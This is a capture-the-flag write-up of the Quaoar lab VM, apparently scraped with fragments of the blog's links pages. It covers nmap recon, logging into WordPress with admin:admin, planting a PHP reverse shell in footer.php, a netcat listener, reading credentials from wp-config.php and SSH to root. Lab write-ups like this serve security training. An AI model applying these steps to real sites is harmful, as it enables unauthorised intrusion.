It\u0026rsquo;s a Boot2Root type (Starting at the Boot and get to the superuser \u0026ldquo;root\u0026rdquo;)\nInitial Analysis The goal is set at three flags on the machine:\nGet a shell Get root access Optional: post exploration flag Starting up the VM in VirtualBox the machine exposes it\u0026rsquo;s IP.\nStep by Step Step 1: nmap recon Let\u0026rsquo;s start with the standard recon nmap scan:\nn41lit@n41lit:~$ nmap -sV -O -A 192.168.1.101 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-29 09:58 EST Nmap scan report for 192.168.1.101 Host is up (0.0010s latency).

Let\u0026rsquo;s use a Web-Browser to see if we can get started out.\nStep 2: Web Recon and Compromise of the Admin Interface http://\u0026lt;IP_ADDR\u0026gt;:80 in the Webbrowser opens this Webpage:\nIt states\nClick here to know what you need to know\nAfter a click on that notice, we get directed to the Hack_The_Planet.jpg image:\nSo lets continue with checking the robots.txt if there are any hints.\nIndeed, lets see whats behind /wordpress/:\nIt\u0026rsquo;s a Wordpress site. When we scroll down we can see a Log In field.\nLet\u0026rsquo;s try some default stuff.\nBullseye, admin:admin works!\nStep 3: Reverse shell We can leverage a reverse shell script from pentestmonkey [src] to gain access.\nThe script needs to go into Apperance \u0026gt; Editor \u0026gt; footer.php\nChange the IP in the script, load the Page again and start a netcat listener to get a shell:\nn41lit@n41lit:~$ nc -lvnp 1234 listening on [any] 1234 ... connect to [192.168.1.201] from (UNKNOWN) [192.168.1.101] 32835 Linux Quaoar 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux 12:15:23 up 4:56, 0 users, load average: 0.34, 0.22, 0.16 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ Step 4: Finding the first flag After we get a shell, lets look around for the first flag\n$ cd home $ ls wpadmin $ cd wpadmin $ ls flag.txt $ cat flag.txt 2bafe61f03117ac66a73c3c514de796e Hey there. From reading the /home/wpadmin/flag.txt file we get our first flag: 2bafe61f03117ac66a73c3c514de796e\nStep 5: Finding the second flag Lets search for some config files, afterall the Web login was not protected that good.\n$ locate config \u0026lt;SNIP\u0026gt; /var/www/upload/config.php /var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config /var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/.htaccess /var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config.php /var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/config_sik.php /var/www/upload/modules/tiny_mce_4/tiny_mce/filemanager/config/index.php /var/www/wordpress/wp-config-sample.php /var/www/wordpress/wp-config.php /var/www/wordpress/wp-admin/setup-config.php /var/www/wordpress/wp-content/plugins/akismet/views/config.php We can look into /var/www/wordpress/wp-config.php\n$ cat /var/www/wordpress/wp-config.php \u0026lt;?php \u0026lt;SNIP\u0026gt; // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;root\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;rootpassword!\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); \u0026lt;SNIP\u0026gt; Look, they used the root user in the config.\nRemember, they had an open port 22. After all we can probably just SSH as root?\nkali@kali:~$ ssh root@192.168.1.101 \u0026lt;SNIP\u0026gt; root@192.168.1.101\u0026#39;s password: Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic-pae i686) * Documentation: https://help.ubuntu.com/ System information as of Wed Jan 29 12:25:03 EST 2025 System load: 0.17 Processes: 97 Usage of /: 29.9% of 7.21GB Users logged in: 0 Memory usage: 56% IP address for eth0: 192.168.1.101 Swap usage: 0% IP address for virbr0: 192.168.122.1 Graph this data and manage this system at https://landscape.canonical.com/ New release \u0026#39;14.04.5 LTS\u0026#39; available.

But you can try for shure!\nConclusion Summary The attack began with an Nmap scan, which revealed multiple open ports, including HTTP (80) and SSH (22). A WordPress site was discovered at /wordpress/, with an easily guessable admin login (admin:admin). Using a PHP reverse shell, an initial foothold was gained. The first flag was found in /home/wpadmin/flag.txt. Further investigation revealed database credentials in wp-config.php, which allowed direct SSH access as root, leading to the second flag.\nLessions learned Avoid weak credentials - admin:admin isn\u0026rsquo;t that strong Restrict access to sensitive files - wp-config.php Protect and monitor open services - Logging in with root credentials was trivial References reverse shell script from pentestmonkey\n","date":"27 January 2025","externalUrl":null,"permalink":"/posts/20250128writeupquaoar/","section":"Posts","summary":"In this article I show the process throgh the Quaoar \u0026ldquo;Boot2Root\u0026rdquo; CTF","title":"Writeup: Quaoar","type":"posts"},{"content":" Links üì∞ Cybersecurity News BleepingComputer\nKrebsonSecurity\nDarkReading\nüö© Real Attacks The DFIR Report - Thanks @domi\nüß† Intel AbuseIPDB\nüìö Definitions, Libraries Living of Land Drivers\nSysmon-modular\nüõ°Ô∏è Defence Tooling MalwareBazar\nüó°Ô∏è Offensive Tooling ","externalUrl":null,"permalink":"/links/","section":"n41lit Blog","summary":"","title":"","type":"page"},{"content":" Sources, References and Examples Sources are specified:\n[src] - Sources: Link to where a information or thought is coming from.\n[ref] - References: Link to a supporting or further informations.\n[eg] - Example: Link to an example of a information.\nThis website contains links to external sites that are not operated by me.
